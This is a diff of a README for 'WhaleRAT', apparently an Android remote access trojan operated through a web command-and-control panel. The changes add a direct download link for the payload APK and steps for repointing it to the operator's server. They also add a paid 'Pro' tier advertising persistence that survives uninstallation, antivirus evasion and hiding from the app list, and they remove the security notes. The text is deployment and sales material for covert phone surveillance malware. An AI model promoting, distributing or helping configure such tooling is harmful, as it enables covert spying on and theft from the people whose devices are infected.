@@ -53,19 +53,6 @@
 
 ---
 
-## 📸 Screenshots
-
-<div align="center">
-
-### 🖥️ Real-Time C2 Dashboard & Live Target Monitor
-
-
-<img src="images/main-panel.png" alt="Whale RAT Main Control Panel" width="920">
-
-</div>
-
----
-
 ## ✨ Features
 
 | Category | Capability |
@@ -207,7 +194,7 @@ Edit **`config.json`** before deploying:
 | `ADMIN_USERNAME` | Username for the web panel login |
 
 > [!IMPORTANT]
-> Never commit `config.json` with real credentials to a public repo. Use Railway environment variables instead (see deployment section).
+> Never commit `config.json` with real credentials to a public repo. Use only private Github repo.
 
 ---
 
@@ -240,10 +227,11 @@ The APK needs to point to **your** Railway URL before you install it on a device
 ### How to edit the APK with MT Manager:
 
 1. **Download [MT Manager](https://github.com/Yau08/MT-Manager/releases/download/v2.14.5/MT-Manager_2.14.5_v8a.apk)** and install it on your Android device
-2. Copy `app/drop.apk` to your Android device
+2. Copy **[drop.apk](https://github.com/zidhuxdev/WhaleRAT/raw/refs/heads/main/app/drop.apk)** to your Android device
 3. Open **MT Manager** → navigate to `drop.apk` → tap it → choose **"View"**
 4. Inside the APK, find and open the file **`assets/config.json`**
 5. You'll see this:
+
    ```json
    {
      "server_url": "https://whalerat-production.up.railway.app/",
@@ -325,24 +313,28 @@ The web panel is accessible at `https://your-domain/` after logging in at `/logi
 
 ---
 
-<details>
-<summary>🔐 Security Notes</summary>
+### 🐋 WhaleRAT Pro
 
-<br>
+The free build in this repo is the limited functional core. **WhaleRAT Pro** is for people who need the parts that actually matter in the field:
 
-> [!CAUTION]
-> This tool is **deliberately powerful**. Keep these in mind:
+- **Stealthier persistence** — survives reboots, uninstallation
+- **Antivirus bypass surface** — reduced foreground footprint, quieter permission prompts, hide from launcher/app list
+- **Tighter C2 hygiene** — more heavy UI Controls
+- **Priority support** — direct line to me, not a GitHub issue queue
+- **Custom modules on request** — tell me what you need and we scope it
 
-- **Change default credentials** — never deploy with `ADMIN_CODE: 123456`
-- **Use HTTPS** — Railway provides TLS automatically; never run on plain HTTP in production
-- **Restrict `ADMIN_ID`** — the bot token + admin ID are your only gate; protect them
-- **Keep `config.json` out of version control** — add it to `.gitignore` or use env vars
-- **WebAuthn** — register a passkey in the admin panel for stronger auth than passwords
-- **Log retention** — logs are kept for 7 days and auto-compacted; `logs.jsonl` may contain sensitive data
+**No pressure either way — using this repo for free forever is completely fine. Pro just exists because people asked.**
 
 ---
 
-</details>
+### 📡 Support, Guides & WhaleRAT Pro
+
+| Channel | Where |
+|---|---|
+| ✈️ **Telegram** | [@zidhuxd](https://t.me/zidhuxd) — fastest, DM open |
+| 🌐 **Website** | [zidhuxd.com/contact](https://zidhuxd.com/contact) — form, if Telegram isn't your thing |
+
+---
 
 ## 🛑 Disclaimer & Legal Warning
 
